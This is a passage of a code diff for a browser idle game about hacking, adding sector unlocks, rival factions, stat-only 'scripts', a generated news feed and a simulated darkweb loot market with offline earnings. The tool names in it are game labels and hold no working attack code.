     <div id="repdisp">REPUTATION<br><span class="rv">×${G.rep.toFixed(1)}</span></div>
     <div id="pressec">
       <div id="prestitle">// BURN IDENTITY</div>
-      <div id="presdesc">Wipe alias, credits, upgrades.<br>Keep <span style="color:#ffb700">Reputation</span> (+×0.5 forever).<br><br>Req: $10,000 or 40 missions.<br>Missions: <span style="color:#00ff41">${G.missionsCompleted}</span></div>
+      <div id="presdesc">Wipe alias, credits, upgrades, faction.<br>Keep <span style="color:#ffb700">Reputation</span> (+×0.5 forever).<br><br>Req: $10,000 or 40 missions.<br>Missions: <span style="color:#00ff41">${G.missionsCompleted}</span> | All-time: $${fmtNum(G.totalCreditsEarned||0)}</div>
       <button id="presbtn" onclick="doPrestige()" ${canPrestige()?'':'disabled'}>[ BURN THIS IDENTITY ]</button>
     </div>
-    <div style="margin:10px;padding:12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;line-height:1.8;">
-      <div style="color:#00aa2a;margin-bottom:6px;letter-spacing:2px;">// HARDWARE</div>
+    <div style="margin:8px 10px;padding:12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;line-height:1.8;">
+      <div style="color:#00aa2a;margin-bottom:6px;letter-spacing:2px;">// HARDWARE STATUS</div>
       <div>Bandwidth: ${fmtBW(G.bandwidth)}/s</div>
       <div>CPU: ${fmtCPU(G.cpu)}</div>
       <div>RAM: ${G.ram>=1024?(G.ram/1024).toFixed(0)+'GB':G.ram+'MB'}</div>
       <div>Latency: ${G.latency}ms</div>
-      <div>Target Intel: ${intelCount} known targets</div>
-      <div>Interrupt fails: ${G.interruptFails||0} (resets per mission)</div>
+      <div>Faction: <span style="color:${G.faction==='cipher'?'#cc44ff':G.faction==='ghost'?'#00d4ff':'#4a7a4a'}">${G.faction?G.faction.toUpperCase():'NONE'}</span></div>
+      <div>Owned nodes: ${owned}</div>
       <div>Prestige runs: ${G.prestigeCount}</div>
-      <div style="margin-top:8px;"><button onclick="if(confirm('Wipe all?')){localStorage.removeItem('${SK}');location.reload();}" style="background:none;border:1px solid #1a3a1a;color:#4a7a4a;font-family:Share Tech Mono,monospace;font-size:10px;padding:4px 8px;cursor:pointer;border-radius:2px;-webkit-appearance:none;">WIPE SAVE</button></div>
+    </div>
+    <div style="margin:0 10px 10px;padding:10px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;">
+      <div style="color:#00aa2a;margin-bottom:6px;letter-spacing:2px;">// v01d MESSAGES: ${shownMsgs.size}/15</div>
+      <div>Next at mission <span style="color:#cc44ff">${VOID_MSGS.find(m=>!shownMsgs.has(m.at))?.at||'—'}</span></div>
+      <div style="margin-top:8px;"><button onclick="if(confirm('Wipe all?')){localStorage.clear();location.reload();}" style="background:none;border:1px solid #1a3a1a;color:#4a7a4a;font-family:Share Tech Mono,monospace;font-size:10px;padding:4px 8px;cursor:pointer;border-radius:2px;-webkit-appearance:none;">WIPE SAVE</button></div>
     </div>`;
 }
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // SAVE / LOAD / OFFLINE
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function save(){G.lastSeen=Date.now();localStorage.setItem(SK,JSON.stringify(G));}
 function load(){
   const raw=localStorage.getItem(SK); if(!raw)return false;
@@ -1237,62 +1649,797 @@ function load(){
 function calcOff(secs){
   if(secs<30)return null;
   const mins=Math.min(Math.floor(secs/60),480);
-  const t=MT[Math.min(Math.floor(G.missionsCompleted/10),MT.length-1)];
-  const earned=Math.floor(t.reward.base*G.rep/2*mins*.25);
-  return{mins,earned};
-}
-function showOffModal(g){
-  if(!g||g.earned<=0)return;
-  G.credits+=g.earned;
-  document.getElementById('offlog').innerHTML=`<div>Away: <span class="hi">${g.mins}min</span></div><div>Passive: <span class="hi">+$${fmtNum(g.earned)}</span></div>`;
-  document.getElementById('offmod').classList.add('on');
-}
-function closeOff(){document.getElementById('offmod').classList.remove('on');updateUI();}
+  const cappedSecs=mins*60;
 
-// ══════════════════════════════════════════════════════
+  // Script/node passive income (existing)
+  const t=MT[Math.min(Math.floor(G.missionsCompleted/10),MT.length-1)];
+  const passiveEarned=Math.floor(t.reward.base*G.rep/2*mins*.2);
+
+  // Market offline sales — simulate market ticks that did not happen
+  let marketEarned=0;
+  const marketLog=[];
+  if(G.lootInventory&&G.lootInventory.length>0){
+    const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5;
+    const ticksOffline=Math.floor(cappedSecs/2); // 2s tick rate
+    G.lootInventory.forEach(loot=>{
+      if(loot.qty<=0)return;
+      const sellRate=Math.max(0.5,bwMult*(loot.qty>1000?2:1));
+      const mult=getLootValueMult(loot.type);
+      // How many units sold while away
+      const unitsSold=Math.min(loot.qty,Math.floor(sellRate*ticksOffline));
+      const earned=unitsSold*loot.valueEach*mult;
+      if(earned>0){
+        marketEarned+=earned;
+        marketLog.push({label:loot.label,qty:unitsSold,earned});
+        loot.qty-=unitsSold;
+        loot.totalValue=loot.qty*loot.valueEach;
+      }
+    });
+    // Clean out empty listings
+    G.lootInventory=G.lootInventory.filter(l=>l.qty>0);
+    G.marketEarnings=(G.marketEarnings||0)+marketEarned;
+  }
+
+  const totalEarned=passiveEarned+Math.floor(marketEarned);
+  if(totalEarned<=0)return null;
+  return{mins,passiveEarned,marketEarned:Math.floor(marketEarned),marketLog,totalEarned};
+}
+
+function showOffModal(g){
+  if(!g||g.totalEarned<=0)return;
+  G.credits+=g.totalEarned;
+
+  let html=`<div>Away: <span class="hi">${g.mins}min</span></div>`;
+  if(g.passiveEarned>0){
+    html+=`<div>Passive nodes: <span class="hi">+$${fmtNum(g.passiveEarned)}</span></div>`;
+  }
+  if(g.marketEarned>0){
+    html+=`<div>Market sales: <span class="hi">+$${fmtNum(g.marketEarned)}</span></div>`;
+    // Show breakdown of what sold
+    g.marketLog.forEach(m=>{
+      html+=`<div style="padding-left:8px;color:#4a7a4a;">${fmtNum(m.qty)} ${m.label} → $${fmtNum(m.earned)}</div>`;
+    });
+  }
+  html+=`<div style="margin-top:6px;border-top:1px solid #1a3a1a;padding-top:6px;">Total: <span class="hi">+$${fmtNum(g.totalEarned)}</span></div>`;
+
+  el('offlog').innerHTML=html;
+  el('offmod').classList.add('on');
+}
+function closeOff(){el('offmod').classList.remove('on');updateUI();}
+
+// ═══════════════════════════════════════════════
 // BOOT
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
+
+// ═══════════════════════════════════════════════
+// TERMINAL TABS
+// ═══════════════════════════════════════════════
+function switchTab(name){
+  G.activeTab=name;
+  document.querySelectorAll('.tpane').forEach(p=>p.classList.remove('act'));
+  document.querySelectorAll('.ttab').forEach(t=>t.classList.remove('act'));
+  const paneId=name==='term'?'term':'term-'+name;
+  const pane=document.getElementById(paneId);
+  if(pane){pane.classList.add('act');pane.scrollTop=pane.scrollHeight;}
+  const tabEl=document.getElementById('ttab-'+name);
+  if(tabEl)tabEl.classList.add('act');
+  if(name==='msg'){G.msgUnread=false;el('msg-badge').style.display='none';}
+  if(name==='news')renderNewsPane();
+}
+
+// ═══════════════════════════════════════════════
+// SECTOR SYSTEM
+// ═══════════════════════════════════════════════
+const SECTORS=[
+  {id:0,name:'DOWNTOWN',        req:{missions:0, owned:0,   credits:0},     color:'#00ff41', desc:'Local blocks. Open networks. Low risk.'},
+  {id:1,name:'FINANCIAL DIST',  req:{missions:5, owned:2,   credits:800},   color:'#ffb700', desc:'Corps and banks. Better loot. Rivals present.'},
+  {id:2,name:'GOV QUARTER',     req:{missions:8, owned:3,   credits:5000},  color:'#ff2d2d', desc:'Municipal systems. High risk. Always watched.'},
+  {id:3,name:'UNDERTOWN',       req:{missions:6, owned:4,   credits:20000}, color:'#cc44ff', desc:'Darknet. Black markets. Faction territory.'},
+  {id:4,name:'INTL HUB',        req:{missions:8, owned:5,   credits:80000}, color:'#00d4ff', desc:'Global infrastructure. Maximum risk.'},
+];
+
+function getSectorMissions(sectorId){
+  // Each sector has a subset of missions appropriate to its tier
+  const pools={
+    0:['nmap_scan','john_crack','hydra_ssh'],
+    1:['nc_listen','scp_exfil','aircrack'],
+    2:['sqlmap','metasploit'],
+    3:['ssh_backdoor','cipher_darkweb','ghost_corp'],
+    4:['worm_deploy'],
+  };
+  return pools[sectorId]||[];
+}
+
+function canUnlockSector(id){
+  if(id===0)return true;
+  const prev=SECTORS[id-1];
+  const sp=G.sectorProgress[id-1]||{missions:0,owned:0};
+  const req=SECTORS[id].req;
+  // Faction gate for sector 3
+  if(id===3&&!G.faction)return false;
+  return sp.missions>=req.missions && sp.owned>=req.owned && G.credits>=req.credits;
+}
+
+function tryUnlockSectors(){
+  SECTORS.forEach(s=>{
+    if(!G.unlockedSectors.includes(s.id)&&canUnlockSector(s.id)){
+      G.unlockedSectors.push(s.id);
+      log(`> SECTOR UNLOCKED: ${s.name}`,'info');
+      logMsg(`> New sector accessible: ${s.name}. Expand your territory.`,'info');
+    }
+  });
+}
+
+function onMissionCompletedInSector(missionId){
+  const sector=G.currentSector;
+  if(!G.sectorProgress[sector])G.sectorProgress[sector]={missions:0,owned:0};
+  G.sectorProgress[sector].missions++;
+  tryUnlockSectors();
+}
+
+function countOwnedInSector(sectorId){
+  // Simplified: total owned nodes counts toward all sectors
+  return Object.values(G.networkNodes||{}).filter(n=>n.status==='owned').length;
+}
+
+// ═══════════════════════════════════════════════
+// RIVAL FACTIONS
+// ═══════════════════════════════════════════════
+const RIVAL_NODES=['axiom_db','fed_node','market','cipher_node','interpol'];
+
+function initRivalNodes(){
+  // Only set rivals in sector 1+ when those sectors are unlocked/visible.
+  // Sector 0 (local net) is always yours — no rivals.
+  // Rivals are seeded when a sector is first entered (unlocked).
+  // This is called when unlocking sector 1+.
+  if(G.unlockedSectors.includes(1)){
+    if(G.networkNodes.corp_db&&G.networkNodes.corp_db.status==='scanned')
+      G.networkNodes.corp_db.status='rival_cipher';
+  }
+  if(G.unlockedSectors.includes(2)){
+    if(G.networkNodes.interpol&&G.networkNodes.interpol.status==='scanned')
+      G.networkNodes.interpol.status='rival_gov';
+  }
+  if(G.unlockedSectors.includes(3)){
+    if(G.networkNodes.market&&G.networkNodes.market.status==='scanned')
+      G.networkNodes.market.status='rival_ghost';
+  }
+}
+
+function rivalPassiveReclaim(){
+  // Rivals slowly try to reclaim your nodes — 1 node per ~10 min
+  const yourNodes=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned');
+  if(yourNodes.length<=2)return; // skip reclaim if only 2 nodes
+  const target=yourNodes[rnd(0,yourNodes.length-1)];
+  if(!target)return;
+  const rival=G.faction==='cipher'?'rival_ghost':'rival_cipher';
+  G.networkNodes[target[0]].status='rival_cipher';
+  logMsg(`> RIVAL RECLAIM: ${target[1].name||target[0]} taken by rival faction. Attack it back.`,'warn');
+  G.msgUnread=true; el('msg-badge').style.display='inline';
+}
+
+function triggerRivalRaid(){
+  if(!G.missionRunning||intState.active)return;
+  if(G.phase!=='process')return;
+  // Fire a special interrupt
+  const raidInt={
+    id:'rival_raid',
+    title:'⚠ RIVAL FACTION RAID',
+    body:'A rival operator is attacking your node. Tap to defend before it falls.',
+    type:'timed_tap',timer:10,
+    tapLabel:'[ DEFEND NODE ]',
+    successMsg:'Node defended. Rival repelled.',
+    failMsg:'Node lost to rival faction.',
+    heatOnFail:10,
+    cond:()=>true,
+  };
+  fireInterrupt(raidInt);
+}
+
+// ═══════════════════════════════════════════════
+// SCRIPTS / APPS SYSTEM
+// ═══════════════════════════════════════════════
+const SCRIPT_DEFS=[
+  {id:'keylogger',  name:'keylogger.py',   cr_s:2,   heat_s:.04, ram:1, desc:'Credit drip from owned node.',   req:0},
+  {id:'portscanner',name:'portscanner.sh', cr_s:0,   heat_s:0,   ram:1, desc:'Passive recon. Reveals sector intel.', req:0},
+  {id:'sniffer',    name:'sniffer.py',     cr_s:0,   heat_s:.02, ram:1, desc:'Reveals locked sector nodes.',   req:5},
+  {id:'miner',      name:'miner.sh',       cr_s:8,   heat_s:.28, ram:2, desc:'High yield crypto mining. Hot.', req:10},
+  {id:'ddos',       name:'ddos.py',        cr_s:0,   heat_s:.14, ram:2, desc:'Attacks rival nodes auto.',      req:20, attacks:true},
+];
+
+function getScriptSlots(){return Math.max(1,Math.floor(G.ram/512));}
+function getUsedSlots(){return (G.deployedScripts||[]).filter(s=>s.active).reduce((acc,s)=>{const def=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return acc+(def?.ram||1);},0);}
+function isScriptUnlocked(def){return G.missionsCompleted>=def.req;}
+
+function deployScript(scriptId,nodeId){
+  const def=SCRIPT_DEFS.find(d=>d.id===scriptId); if(!def)return;
+  const used=getUsedSlots(), slots=getScriptSlots();
+  if(used+def.ram>slots){log(`> No RAM slots available (${used}/${slots} used)`,'warn');return;}
+  if(!G.deployedScripts)G.deployedScripts=[];
+  const existing=G.deployedScripts.find(s=>s.scriptId===scriptId&&s.nodeId===nodeId);
+  if(existing){existing.active=!existing.active;log(`> ${existing.active?'STARTED':'STOPPED'}: ${def.name}`,'ok');}
+  else{G.deployedScripts.push({scriptId,nodeId,active:true});log(`> DEPLOYED: ${def.name}`,'ok');}
+  playOK(); renderPanel('scripts');
+}
+
+// Script tick — runs every 2 seconds
+function scriptTick(){
+  if(!G.deployedScripts)return;
+  const ownedNodes=Object.keys(G.networkNodes||{}).filter(k=>G.networkNodes[k].status==='owned');
+  if(ownedNodes.length===0)return;
+  let totalCr=0, totalHeat=0;
+  G.deployedScripts.forEach(s=>{
+    if(!s.active)return;
+    const def=SCRIPT_DEFS.find(d=>d.id===s.scriptId); if(!def)return;
+    // Auto-assign to first owned node if no specific node
+    const targetNode=s.nodeId||ownedNodes[0];
+    if(!ownedNodes.includes(targetNode)){s.active=false;return;}
+    totalCr+=def.cr_s*2; // 2s tick
+    totalHeat+=def.heat_s*2;
+    // DDoS auto-attacks rival nodes
+    if(def.attacks&&Math.random()<.05){
+      const rivals=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status.startsWith('rival'));
+      if(rivals.length){
+        const target=rivals[rnd(0,rivals.length-1)];
+        G.networkNodes[target[0]].status='scanned';
+        logMsg(`> DDoS: ${target[1].name||target[0]} taken offline by ddos.py`,'ok');
+        G.msgUnread=true; el('msg-badge').style.display='inline';
+      }
+    }
+    // Port scanner reveals sector nodes
+    if(def.id==='portscanner'&&Math.random()<.02)onReconComplete();
+  });
+  if(totalCr>0){G.credits+=totalCr*G.rep;updateUI();}
+  if(totalHeat>0)addHeat(totalHeat);
+}
+
+function renderScripts(container){
+  // Section divider when rendered inside market panel
+  const divider=document.createElement('div');
+  divider.style.cssText='padding:8px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;margin-top:6px;';
+  divider.textContent='// DEPLOYED SCRIPTS';
+  container.appendChild(divider);
+  // Slot bar
+  const used=getUsedSlots(), slots=getScriptSlots();
+  const slotBar=document.createElement('div'); slotBar.className='slot-bar';
+  let pips='';
+  const active=G.deployedScripts?.filter(s=>s.active)||[];
+  for(let i=0;i<slots;i++){
+    // Check if slot is used by miner (yellow)
+    const si=i<used;
+    const isMiner=si&&active[i]?.scriptId==='miner';
+    pips+=`<div class="slot-pip ${si?('used'+(isMiner?' mining':'')):''}"></div>`;
+  }
+  slotBar.innerHTML=`<div style="color:#4a7a4a;margin-bottom:4px;">RAM SLOTS: <span style="color:#00ff41">${used}/${slots}</span> used (${G.ram>=1024?(G.ram/1024).toFixed(0)+'GB':G.ram+'MB'} RAM)</div><div class="slot-track">${pips}</div>`;
+  container.appendChild(slotBar);
+
+  // Owned nodes list
+  const owned=Object.entries(G.networkNodes||{}).filter(([k,v])=>v.status==='owned');
+  if(owned.length===0){
+    const tip=document.createElement('div');
+    tip.style.cssText='margin:8px 10px;padding:10px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
+    tip.textContent='Own nodes by completing WORM DEPLOY or SSH BACKDOOR missions. Scripts deploy against owned nodes.';
+    container.appendChild(tip); return;
+  }
+
+  // Script list
+  SCRIPT_DEFS.forEach(def=>{
+    const unlocked=isScriptUnlocked(def);
+    const deployed=G.deployedScripts?.find(s=>s.scriptId===def.id&&s.active);
+    const card=document.createElement('div'); card.className=`script-card ${deployed?'deployed':''}`;
+    const stats=[];
+    if(def.cr_s>0)stats.push(`+$${def.cr_s}/s`);
+    if(def.heat_s>0)stats.push(`heat: +${def.heat_s}/s`);
+    if(def.attacks)stats.push('auto-attacks rivals');
+    stats.push(`${def.ram} RAM slot${def.ram>1?'s':''}`);
+    card.innerHTML=`
+      <div class="script-info">
+        <div class="script-name">${def.name}</div>
+        <div class="script-desc">${def.desc}</div>
+        <div class="script-stats">${stats.join(' | ')}${!unlocked?' | 🔒 '+def.req+' missions':''}</div>
+      </div>`;
+    if(unlocked){
+      const btn=document.createElement('button'); btn.className=`script-btn ${deployed?'active':''}`;
+      btn.textContent=deployed?'STOP':'RUN';
+      btn.onclick=()=>deployScript(def.id, owned[0]?.[0]);
+      card.appendChild(btn);
+    }
+    container.appendChild(card);
+  });
+
+  // Active scripts summary
+  if((G.deployedScripts||[]).filter(s=>s.active).length>0){
+    const summ=document.createElement('div');
+    summ.style.cssText='margin:8px 10px;padding:8px;border:1px solid #003a0f;border-radius:4px;font-size:10px;color:#4a7a4a;background:rgba(0,255,65,.03);';
+    const activeS=G.deployedScripts.filter(s=>s.active);
+    const totalCrS=activeS.reduce((a,s)=>{const d=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return a+(d?.cr_s||0);},0);
+    const totalHS=activeS.reduce((a,s)=>{const d=SCRIPT_DEFS.find(d=>d.id===s.scriptId);return a+(d?.heat_s||0);},0);
+    summ.innerHTML=`<div style="color:#00ff41;margin-bottom:3px;">ACTIVE SCRIPTS: ${activeS.length}</div><div>Income: +$${totalCrS.toFixed(1)}/s | Heat: +${totalHS.toFixed(2)}/s</div>`;
+    container.appendChild(summ);
+  }
+}
+
+// ═══════════════════════════════════════════════
+// NEWS SYSTEM
+// ═══════════════════════════════════════════════
+const NEWS_TEMPLATES=[
+  {t:"BREACH: {corp} in {district} confirms unauthorized access — {n}K records exposed.",alert:false},
+  {t:"FBI CYBER: Task force expanded targeting alias matching ghost_r00t pattern in downtown area.",alert:true},
+  {t:"DARKMARKET: Credential dump from {district} businesses posted — source unknown.",alert:false},
+  {t:"CITY IT ALERT: Coordinated port scanning detected across {district} block infrastructure.",alert:true},
+  {t:"SECURITY FIRM: GHOSTNET-linked actor exfiltrated {n}GB from {corp} — $2.3M impact.",alert:false},
+  {t:"CIPHER COLLECTIVE claims {corp} 72-hour outage. No ransom demanded.",alert:false},
+  {t:"VULN: {cve} — critical RCE in OpenSSH. Thousands of city devices still unpatched.",alert:false},
+  {t:"MUNICIPAL ALERT: Anomalous traffic on city hall internal network. Investigation ongoing.",alert:true},
+  {t:"SECURITY BLOG: ghost_r00t signature found in {n} separate incidents across the city.",alert:true},
+  {t:"UNDERTOWN FORUMS: Zero-day for {corp} auth system listed at $180k.",alert:false},
+  {t:"LEAKED MEMO: They know the alias. They do not know the face. They are close.",alert:true},
+  {t:"THREAT INTEL: Botnet with ghost_r00t C2 signature now spans {n}+ city blocks.",alert:false},
+  {t:"ISP SUBPOENA: Three providers ordered to produce logs for {ip} subnet activity.",alert:true},
+  {t:"CITY COUNCIL: Emergency session called over repeated breaches in financial district.",alert:false},
+  {t:"COFFEE SHOP OWNER: Our POS system was compromised. Police have no leads.",alert:false},
+  {t:"TRANSIT AUTHORITY: Scheduling system breached. Service disruptions expected.",alert:true},
+];
+
+function generateNewsItem(){
+  const template=NEWS_TEMPLATES[rnd(0,NEWS_TEMPLATES.length-1)];
+  const corps=[randCorp(1),randCorp(2),randCorp(1),randCorp(3),randCorp(4)];
+  const sectors=['local','corporate','government','darkweb'];
+  const districts=['downtown','financial district','gov quarter','undertown','the blocks'];
+  const text=template.t
+    .replace('{corp}',corps[rnd(0,corps.length-1)])
+    .replace('{n}',rnd(10,500))
+    .replace('{district}',districts[rnd(0,districts.length-1)])
+    .replace('{sector}',districts[rnd(0,districts.length-1)])
+    .replace('{cve}',randCVE())
+    .replace('{ip}',randSN());
+  return{text,alert:template.alert,time:Date.now()};
+}
+
+function addNewsItem(){
+  const item=generateNewsItem();
+  if(!G.newsItems)G.newsItems=[];
+  G.newsItems.unshift(item); // newest first
+  if(G.newsItems.length>20)G.newsItems.pop();
+  // Append to news pane
+  const pane=document.getElementById('term-news');
+  if(pane){
+    const el2=document.createElement('div'); el2.className=`news-item ${item.alert?'alert':''}`;
+    const mins=0;
+    el2.innerHTML=`<div class="nh">${item.alert?'⚠ ALERT':'// NEWS'} — just now</div>${item.text}`;
+    pane.insertBefore(el2, pane.firstChild);
+  }
+}
+
+function renderNewsPane(){
+  const pane=document.getElementById('term-news'); if(!pane)return;
+  pane.innerHTML='';
+  if(!G.newsItems||G.newsItems.length===0){
+    const e=document.createElement('span');e.className='ll dim';e.textContent='// No news feeds active yet. Run PORT SCANNER script to monitor feeds.';
+    pane.appendChild(e); return;
+  }
+  G.newsItems.forEach(item=>{
+    const el2=document.createElement('div'); el2.className=`news-item ${item.alert?'alert':''}`;
+    const minsAgo=Math.floor((Date.now()-item.time)/60000);
+    el2.innerHTML=`<div class="nh">${item.alert?'⚠ ALERT':'// NEWS'} — ${minsAgo<1?'just now':minsAgo+'m ago'}</div>${item.text}`;
+    pane.appendChild(el2);
+  });
+}
+
+
+
+// ═══════════════════════════════════════════════
+// LOOT & DARKWEB MARKET SYSTEM
+// Missions produce loot. Loot lists on market. Market trickles credits.
+// ═══════════════════════════════════════════════
+
+// Loot definition per mission
+const LOOT_TABLE={
+  nmap_scan:      {type:'target_intel',   label:'Target Intel',      qty:()=>1,           val:()=>25},
+  john_crack:     {type:'cracked_hashes', label:'Cracked Hashes',    qty:()=>rnd(50,500), val:()=>0.08},
+  hydra_ssh:      {type:'ssh_creds',      label:'SSH Credentials',   qty:()=>rnd(1,10),   val:()=>12},
+  nc_listen:      {type:'shell_access',   label:'Shell Access',      qty:()=>1,           val:()=>45},
+  scp_exfil:      {type:'data_records',   label:'Data Records',      qty:()=>rnd(10000,500000), val:()=>0.04},
+  aircrack:       {type:'wifi_keys',      label:'WiFi Keys',         qty:()=>rnd(1,5),    val:()=>8},
+  sqlmap:         {type:'db_records',     label:'DB Records',        qty:()=>rnd(5000,200000), val:()=>0.06},
+  metasploit:     {type:'root_access',    label:'Root Access',       qty:()=>1,           val:()=>180},
+  ssh_backdoor:   {type:'persist_access', label:'Persistent Access', qty:()=>1,           val:()=>95},
+  worm_deploy:    {type:'botnet_node',    label:'Botnet Node',       qty:()=>1,           val:()=>0},
+  cipher_darkweb: {type:'btc_keys',       label:'BTC Wallet Keys',   qty:()=>rnd(1,8),    val:()=>220},
+  ghost_corp:     {type:'corp_intel',     label:'Corp Intelligence', qty:()=>rnd(5,20),   val:()=>18},
+};
+
+// Faction price bonuses
+function getLootValueMult(lootType){
+  let m=1;
+  if(G.faction==='cipher'&&['ssh_creds','root_access','persist_access','btc_keys'].includes(lootType))m*=1.3;
+  if(G.faction==='ghost'&&['data_records','db_records','corp_intel','target_intel'].includes(lootType))m*=1.3;
+  // Heat spoils market — buyers nervous
+  if(G.heat>70)m*=0.5;
+  else if(G.heat>50)m*=0.8;
+  // Rep multiplier
+  m*=G.rep;
+  return m;
+}
+
+// Add loot to inventory — stacks same type into existing listing
+function generateLoot(missionId, corp){
+  const def=LOOT_TABLE[missionId]; if(!def)return null;
+  const qty=def.qty();
+  const val=def.val();
+  if(val===0)return null;
+  if(!G.lootInventory)G.lootInventory=[];
+
+  // Stack into existing listing of same type if one exists
+  const existing=G.lootInventory.find(l=>l.type===def.type);
+  if(existing){
+    existing.qty+=qty;
+    existing.totalValue=existing.qty*existing.valueEach;
+    // Update source to reflect latest addition
+    existing.source=corp||existing.source;
+    return existing; // return the stacked item
+  }
+
+  // No existing listing — create new one
+  const loot={
+    id:randHash(), type:def.type, label:def.label,
+    qty, valueEach:val, source:corp||'UNKNOWN',
+    listedAt:Date.now(), totalValue:qty*val,
+  };
+  G.lootInventory.push(loot);
+  return loot;
+}
+
+// Market tick — runs every 2s, drains loot into credits
+function marketTick(){
+  if(!G.lootInventory||G.lootInventory.length===0){
+    updateMarketTicker(0,0);
+    return;
+  }
+  // Sell rate: bandwidth determines how fast listings clear
+  // 56k = 0.5 units/s base, scales with BW
+  const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5; // smooth BW scaling
+  let totalEarned=0, totalPending=0;
+  const toRemove=[];
+
+  G.lootInventory.forEach((loot,idx)=>{
+    const sellRate=Math.max(0.5, bwMult*(loot.qty>1000?2:1)); // big dumps sell faster
+    const mult=getLootValueMult(loot.type);
+    const earned=Math.min(loot.qty*loot.valueEach, sellRate*loot.valueEach*mult*2); // 2s tick
+    const qtySold=Math.min(loot.qty, Math.ceil(sellRate*2));
+
+    if(earned>0){
+      G.credits+=earned;
+      G.marketEarnings=(G.marketEarnings||0)+earned;
+      totalEarned+=earned;
+      loot.qty-=qtySold;
+    }
+    totalPending+=loot.qty*loot.valueEach;
+    if(loot.qty<=0)toRemove.push(idx);
+  });
+
+  // Remove fully sold items — only log this as a meaningful terminal event
+  toRemove.reverse().forEach(i=>{
+    const sold=G.lootInventory[i];
+    if(sold){
+      const total=fmtNum(sold.qty<=0?sold.totalValue||0:0);
+      log(`> MARKET: ${sold.label} listing cleared — sale complete`,'dim');
+    }
+    G.lootInventory.splice(i,1);
+  });
+
+  updateMarketTicker(totalEarned/2, totalPending);
+  if(totalEarned>0)updateUI();
+}
+
+function updateMarketTicker(ratePerSec, pending){
+  const el2=el('market-ticker');
+  if(!el2)return;
+  if(pending<=0&&ratePerSec<=0){el2.classList.remove('active');return;}
+  el2.classList.add('active');
+  const warn=G.heat>70?' <span class="mt-warn">⚠ buyers spooked</span>':'';
+  // Always show rate as dollar amount — even fractions of a cent are visible
+  let rateStr;
+  if(ratePerSec>0){
+    // Format: show cents if <$1, dollars if >=$1
+    const rateDisplay=ratePerSec>=1
+      ?`$${ratePerSec.toFixed(2)}`
+      :`$${ratePerSec.toFixed(3)}`;
+    rateStr=`<span class="mt-val">+${rateDisplay}/s</span>`;
+  } else {
+    rateStr=`<span style="color:#4a7a4a">queued</span>`;
+  }
+  el2.innerHTML=`MARKET: ${rateStr} ▸ <span class="mt-val">$${fmtNum(pending)}</span> pending${warn}`;
+}
+
+// Market panel render
+function renderMarket(container){
+  // Summary bar
+  const summary=document.createElement('div');
+  summary.style.cssText='margin:8px 10px;padding:10px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;';
+  const bwMult=Math.log2(G.bandwidth/56+1)*0.5+0.5;
+  const totalPending=(G.lootInventory||[]).reduce((a,l)=>a+l.qty*l.valueEach,0);
+  const heatWarn=G.heat>70?' <span style="color:#ff2d2d">⚠ heat spoiling prices</span>':'';
+  summary.innerHTML=`
+    <div style="color:#ffb700;margin-bottom:6px;letter-spacing:2px;">// DARKWEB MARKET</div>
+    <div>Pending: <span style="color:#00ff41">$${fmtNum(totalPending)}</span>${heatWarn}</div>
+    <div>Sell rate: <span style="color:#00ff41">${bwMult.toFixed(1)}×</span> bandwidth factor</div>
+    <div>Lifetime earned: <span style="color:#00ff41">$${fmtNum(G.marketEarnings||0)}</span></div>`;
+  container.appendChild(summary);
+
+  if(!G.lootInventory||G.lootInventory.length===0){
+    const empty=document.createElement('div');
+    empty.style.cssText='margin:8px 10px;padding:12px;border:1px dashed #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;text-align:center;';
+    empty.textContent='// No listings. Complete missions to generate loot.';
+    container.appendChild(empty); return;
+  }
+
+  // Loot listings
+  const lHdr=document.createElement('div');
+  lHdr.style.cssText='padding:6px 12px;font-size:9px;color:#4a7a4a;letter-spacing:2px;';
+  lHdr.textContent=`// ACTIVE LISTINGS (${G.lootInventory.length})`;
+  container.appendChild(lHdr);
+
+  const bwM2=Math.log2(G.bandwidth/56+1)*0.5+0.5;
+  G.lootInventory.forEach(loot=>{
+    const card=document.createElement('div');
+    card.style.cssText='margin:4px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;font-size:10px;';
+    const mult=getLootValueMult(loot.type);
+    const totalVal=loot.qty*loot.valueEach*mult;
+    const sellRate=Math.max(0.5,bwM2*(loot.qty>1000?2:1));
+    // How many seconds to sell this listing
+    const secsLeft=loot.valueEach>0?Math.ceil(loot.qty/sellRate):0;
+    const timeLeft=secsLeft>3600?Math.ceil(secsLeft/3600)+'h':secsLeft>60?Math.ceil(secsLeft/60)+'m':secsLeft+'s';
+    const ratePerSec=(sellRate*loot.valueEach*mult);
+    const rateStr=ratePerSec>=0.01?`+$${ratePerSec.toFixed(ratePerSec>=1?2:3)}/s`:'<$0.01/s';
+    const minsAgo=Math.floor((Date.now()-loot.listedAt)/60000);
+    card.innerHTML=`
+      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:4px;">
+        <span style="color:#00ff41;font-size:12px;">${loot.label}</span>
+        <span style="color:#ffb700;font-size:12px;">$${fmtNum(totalVal)}</span>
+      </div>
+      <div style="color:#4a7a4a;margin-bottom:3px;">
+        ${fmtNum(loot.qty)} units × $${loot.valueEach.toFixed(2)} each
+        ${mult<1?` <span style="color:#ff2d2d">−heat penalty</span>`:''}
+        ${mult>1&&G.faction?` <span style="color:#cc44ff">+faction bonus</span>`:''}
+      </div>
+      <div style="display:flex;justify-content:space-between;font-size:9px;color:#4a7a4a;">
